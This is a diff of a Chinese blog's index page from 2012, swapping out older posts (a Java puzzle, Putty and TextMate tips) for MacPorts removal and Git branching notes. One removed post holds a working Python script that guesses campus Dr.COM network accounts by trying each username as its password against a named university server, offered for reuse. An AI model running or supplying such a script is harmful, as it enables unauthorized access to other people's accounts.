-           char x = (i - 1) == allOpt.size()?'+':allOpt.get(i - 1).charAt(0);
-           int nextNum = i == allNum.size()?0:allNum.get(i);
-           result = getValue(result, nextNum, x);
-       }
-       
-       return result;
-       
-   }
-   
-   public static int getValue(Integer num1, Integer num2, char opt)
-   {
-       int ret = 0;
-       switch (opt)
-       {
-           case '+':
-               ret = num1 + num2;
-               break;
-           case '-':
-               ret = num1 - num2;
-               break;
-           default:
-               break;
-       }
-       
-       return ret;
-   }
-}</pre>
+		<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>sudo port -f uninstall installed
+</span><span class='line'>
+</span><span class='line'>sudo rm -rf <span class="se">\</span>
+</span><span class='line'>/opt/local <span class="se">\</span>
+</span><span class='line'>/Applications/DarwinPorts <span class="se">\</span>
+</span><span class='line'>/Applications/MacPorts <span class="se">\</span>
+</span><span class='line'>/Library/LaunchDaemons/org.macports.* <span class="se">\</span>
+</span><span class='line'>/Library/Receipts/DarwinPorts*.pkg <span class="se">\</span>
+</span><span class='line'>/Library/Receipts/MacPorts*.pkg <span class="se">\</span>
+</span><span class='line'>/Library/StartupItems/DarwinPortsStartup <span class="se">\</span>
+</span><span class='line'>/Library/Tcl/darwinports1.0 <span class="se">\</span>
+</span><span class='line'>/Library/Tcl/macports1.0 <span class="se">\</span>
+</span><span class='line'>~/.macports
+</span></code></pre></td></tr></table></div></figure>
 
 
-<p>结果是这样的：</p>
+<p>第一行是删除了用MacPorts安装的软件，第二行是删除MacPorts各种相关文件。</p>
 
-<pre class="prettyprint linenums bush:bash" lang="bash">1+2+34+5+67-8+9
-1+234-56-78+9
-1-2+3+45-6+78-9
-12+3+45+67-8-9
-12+34+56+7-8+9
-12-3+4-5+6+7+89
-123+4+5+67-89
-123+4-5-6-7-8+9
-123-4+5-6-7+8-9
-123-4-5+6+7-8-9
-All Run Time: 496ms
-</pre>
-
-
-<p>最后我算了算运行时间，应该这就是很慢的了，幸好只有加减和空，要不然会更麻烦的……</p>
+<p>我删除了MacPorts后就开始用Homebrew了。</p>
 
 		
 		
@@ -638,11 +621,11 @@ All Run Time: 496ms
   
 
 
-<time datetime="2012-04-08T14:20:00+08:00" pubdate data-updated="true">Apr 8<span>th</span>, 2012</time></div>
+<time datetime="2012-02-04T21:53:00+08:00" pubdate data-updated="true">Feb 4<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/acm/'>acm</a>, <a class='category' href='/blog/categories/java/'>java</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/mac/'>mac</a>
 
 
 </div>
@@ -654,110 +637,14 @@ All Run Time: 496ms
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/04/04/crack-drcom-account-in-python/">
+		<a href="/blog/2012/01/26/git-study-branch-rebase/">
 		
-			Python猜研究生账号</a>
+			Git使用重新学习（分支rebase）</a>
 	</h2>
 	<div class="entry-content">
-		<p>嗯，为何要猜研究生账号呢？是这样的，我们学校用的drcom控制网络访问，如果你用本科生账号，那么你最快下载速度也就是100kb/s，如果是老师、研究生账号呢，最快7Mb/s，这是什么差距你应该明白吧？！于是写了一个python的脚本来不断猜测研究生账号，但很可惜的是，猜出来的9个账号经过测试都还是有限速效果，真不知道这些账号是不是研究生账号呢？！！！可恶的学校啊！！！</p>
+		<p>rebase被人翻译成衍合，是和merge功能差不多的一种操作，但提醒一点，进行rebase的内容一定不可以是提交到公共服务器上的内容，简单讲就是rebase操作你在本地自己玩就好了。</p>
 
-<pre class="prettyprint linenums bush:python" lang="python">#! /usr/bin python
-# encoding: utf-8
-
-import urllib2
-import urllib
-import sys
-import types
-
-guess_list = []
-server_url = "http://222.174.155.19/"
-headers = {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6',
-'X-Forwarded-For':'1.1.1.1'}
-
-def usage():
-print "USAGE 00: python guess.py FILEPATH of account list file,like: python guess.py ./lists.dat"
-print "USAGE 01: python guess.py START END like: python guess.py 2009123456 2009145396"
-
-def Login(username, password):
-params = urllib.urlencode({'DDDDD': username, 'upass': password, '0MKKey': "%B5%C7%C2%BC%20Login"})
-request = urllib2.Request(url = server_url, data = params, headers = headers)
-try:
-output = urllib2.urlopen(request, timeout = 3).readlines()
-Log(output[5], username, password)
-except:
-print "timeout!"
-global guess_list
-guess_list = guess_list[1:]
-guess_list.append(username)
-
-def Logout():
-output = urllib2.urlopen(server_url + "F.htm")
-
-def Log(output,username, password):
-# "msga='error1'" =&gt; can not login in web
-result = output.find("msga='error1'")
-if result != -1:
-print "find one!!!"
-f = open("./content.dat", 'a')
-f.write(str(username) + '\n')
-f.close()
-else:
-print "pass!"
-f = open("./bad.dat",'a')
-f.write(str(username) + '\n')
-f.close()
-#drop first element
-global guess_list
-guess_list = guess_list[1:]
-
-def show_result():
-print "Result:##########################################"
-print "Have Guessed:"
-for i in open("./content.dat").readlines():
-print i,
-print "some accounts can not guessed are in bad.dat"
-print "Result:##########################################"
-
-def get_timeout_list(timeout_file_path):
-f = open(timeout_file_path)
-global guess_list 
-guess_list = f.readlines()
-f.close()
-
-if len(sys.argv) == 2:
-# itself and only one argv,the path of account list file...
-get_timeout_list(sys.argv[1])
-elif(len(sys.argv) &lt; 2):
-usage()
-else:
-#start and end account,argv[1] and argv[2]
-start = int(sys.argv[1])
-end = int(sys.argv[2])
-if start &gt; end:
-usage()
-exit(-1)
-else:
-guess_list = range(start, end + 1)
-
-if __name__ == "__main__":
-
-while True:
-for i in guess_list:
-#drop last \n or \r
-if type(i) == types.StringType:
-i = i.rstrip('\n\r')
-Logout()
-print "Guess: " + str(i)
-Login(i, i)
-
-if len(guess_list) == 0:
-break
-show_result()</pre>
-
-
-<p>主要就是用了drcom的网页登陆，当然大部分账号都是不能web登陆的啦，不过账号密码正确的话会弹出来一个提示，drcom是使用的js来显示的，于是我监测了是不是有“msga=&lsquo;error1&#8217;”字符串，当然严格来讲还得监测是不是有&#8221;Msg=0&#8221;这个字符串才好，我就省略了……</p>
-
-<p>希望被drcom困扰的人们都能拿去用用，希望对你们有帮助！</p>
+<p>详细点的说明去这里看吧：<a href="http://progit.org/book/zh/ch3-6.html">http://progit.org/book/zh/ch3-6.html</a></p>
 
 		
 		
@@ -777,11 +664,11 @@ show_result()</pre>
   
 
 
-<time datetime="2012-04-04T09:01:00+08:00" pubdate data-updated="true">Apr 4<span>th</span>, 2012</time></div>
+<time datetime="2012-01-26T20:41:00+08:00" pubdate data-updated="true">Jan 26<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/drcom/'>drcom</a>, <a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/git/'>git</a>, <a class='category' href='/blog/categories/study/'>study</a>
 
 
 </div>
@@ -793,18 +680,24 @@ show_result()</pre>
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/03/02/bad-chinese-encoding-in-putty/">
+		<a href="/blog/2012/01/26/git-study-branch-manage/">
 		
-			Putty的中文乱码</a>
+			Git使用重新学习（分支管理）</a>
 	</h2>
 	<div class="entry-content">
-		<p>着急回家就没带mbp，现在需要修改一下服务器上的文件，于是用了putty这款软件，一定要去官方下载啊，记得前一段时间爆发了在putty中嵌入木马从而盗取了N多服务器的root权限事件。</p>
+		<p>分支的使用比较繁杂，前面光说了一些皮毛，现在记录一下分支的管理部分。</p>
 
-<p>不过在用的时候发现查看带有中文字符的文件会出现乱码，在<a href="http://koda.iteye.com/blog/219494">这里</a>得到了解决方案：</p>
+<p>查看分支的详细信息：git branch -v，列出分支最后提交的内容，带星号表示当前分支。</p>
 
-<p><span style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;">0.打开putty主程序，选择window-〉Appearance-〉Font settings-〉Change&hellip;,选择Fixedsys字体,字符集选择CHINESE_GB2312。 </span><br style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;"><br style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;"><span style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;">1.在window-〉Appearance -〉Translation中，Received data assumed to be in which character set 中,把Use font encoding改为UTF-8如果经常使用,把这些设置保存在session里面. </span><br style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;"><br style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;"><span style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;">2.现在打开putty,登录成功后,在shell中输入:export LC_ALL=&lsquo;zh_CN.utf8&#8217; </span></p>
+<p>查看哪些分支已经被并入当前分支：git branch &mdash;merged，也就是说除了那个带星号的分支都是可以删除（-d）的，因为都合并进来了嘛！查看没合并进来的就是&mdash;no-merged开关。删除那些没有合并进来的分支会提示错误，但强制删除就可以了，强制删除用-D开关。</p>
 
-<p><p style="text-align: left;"><span style="font-family: Helvetica, Tahoma, Arial, sans-serif;"><span style="line-height: 25px;">然后再打开文件就没问题了。</span></span></p>
+<h2>不得不说的远程分支</h2>
+
+<p>在github创建了一个项目，在项目管理中开启了github Pages服务，这是个给项目做介绍页面的服务，开启后出现了一个远程分支gh-pages，但本地根本访问不到。首先我们应该明确，这个分支暂时不在我们本地，除非你是在这个服务开启后clone了项目，这样肯定有，否则和我一样的话（从本地push过去的），需要先fetch过来这些远程分支：git fetch origin gh-pages:gh-pages。后面两个由冒号分隔的意思是获取origin中的gh-pages分支，放到本地，在本地也叫gh-pages（冒号右侧），当然你可以根据需要更改冒号右侧的本地分支名字。现在查看一下本地分支就能发现出现两个分支了，切换过去后就能看到github给我们生成的index.html文件，你可以编辑了：）</p>
+
+<p>推送本地分支到远程分支的时候可以像上面这样写:git push origin xxx1:xxx2，意思就是推送本地叫xxx1的分支到origin中，推过去叫xxx2，但此处一般简写，光写本地分支名，这样远程分支中的名字也是和本地一样的。</p>
+
+<p>删除远程分支的命令挺好玩的：git push origin  :xxx，在xxx左边冒号左侧有一个空格，意思是把本地的空分支推到远程的xxx分支上，就是删除xxx分支的意思。</p>
 
 		
 		
@@ -824,11 +717,11 @@ show_result()</pre>
   
 
 
-<time datetime="2012-03-02T12:08:00+08:00" pubdate data-updated="true">Mar 2<span>nd</span>, 2012</time></div>
+<time datetime="2012-01-26T20:10:00+08:00" pubdate data-updated="true">Jan 26<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/putty/'>putty</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/git/'>git</a>, <a class='category' href='/blog/categories/study/'>study</a>
 
 
 </div>
@@ -840,28 +733,26 @@ show_result()</pre>
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/02/23/have-bought-textmate/">
+		<a href="/blog/2012/01/26/git-study-branch/">
 		
-			买了textmate</a>
+			Git使用重新学习（分支）</a>
 	</h2>
 	<div class="entry-content">
-		<p>截至目前，这是我买得最贵的一款软件了——39欧元（327RMB）</p>
+		<p>在git中分支是一个变态技能！</p>
 
-<p>一直在豆瓣Textmate小组中等人家团购，自己也从没在官网试过购买，一看是用的paypal做中转，感觉不靠谱，以前也没试过paypal的支付，没想到这次成功了，先用了张信用卡支付，发现不行，结果换普通银行卡，直接跳转到了银联，然后我又用的信用卡透支……</p>
+<p>创建分支：git branch [branch-name]即可。</p>
 
-<p>稍微配置了一下textmate，按照<a href="http://www.lixiaolai.com/archives/10895.html">这里</a>的方法，其中1.5版本的中文字体那里，建议不要尝试了，不完美，还是等2.0正式发布了吧，听说2.0对于中文字体支持得很好，但我懒得下载测试版来用：）</p>
+<p>git中有个叫master的分支，这是默认的，刚刚创建了一个testing分支，所以这两个指向是一样的，因为刚刚就在master分支下。但是git为何知道我在master呢？因为还有个叫HEAD的默认指针指向了当前正在使用的分支，所以当你切换分支的时候HEAD就会指向新的地方。</p>
 
-<p>加入GetBundles：</p>
+<p>切换分支：git checkout [branch-name]（git checkout -b [branch-name]可以实现新建并切换到此分支）切换分支时最好保持暂存区清洁，否则有可能产生冲突阻止你切换。</p>
 
-<pre class="prettyprint linenums bush:bash" lang="bash">mkdir -p ~/Library/Application\ Support/TextMate/Bundles
-cd !$
-svn co http://svn.textmate.org/trunk/Review/Bundles/GetBundles.tmbundle/
-osascript -e 'tell app "TextMate" to reload bundles'</pre>
+<p>当我们切换到了testing分支后，再做一些提交，我们的testing分支会继续往下走，但master分支还停留在刚才离开的地方，如果我们需要回去，只需要再切换回master分支即可屏蔽刚才所作的提交，保持文件的原始性。</p>
 
+<p>合并分支：git merge [branch-name]，把分支合并到你现在所在的那个分支中，可别合并反喽，当然我感觉反了也没关系，就是个名字的问题吧？</p>
 
-<p>第一次见cd还能这样用，这样简直太方便了！还有最后那句script，多么优美的句子：）</p>
+<p>分支删除用-d开关，git branch -d [branch-name]即可。</p>
 
-<p>以后就要多用textmate了，先放弃emacs。</p>
+<p>合并分支的时候遇到冲突是不可避免的，有些冲突能够自动解决，但还有不少是需要我们手动解决的，此时git会在status中告诉我们，我们打开后就能看到由“=====”分割开的两部分，就是让我们选择，等手动修改好后需要再add进暂存区，此时就能提交了。</p>
 
 		
 		
@@ -881,11 +772,11 @@ osascript -e 'tell app "TextMate" to reload bundles'</pre>
   
 
 
-<time datetime="2012-02-23T19:29:00+08:00" pubdate data-updated="true">Feb 23<span>rd</span>, 2012</time></div>
+<time datetime="2012-01-26T19:36:00+08:00" pubdate data-updated="true">Jan 26<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/macxi-tong-zhong-de-shi-yong-ji-qiao/'>Mac系统中的使用技巧</a>, <a class='category' href='/blog/categories/textmate/'>textmate</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/git/'>git</a>, <a class='category' href='/blog/categories/study/'>study</a>
 
 
 </div>
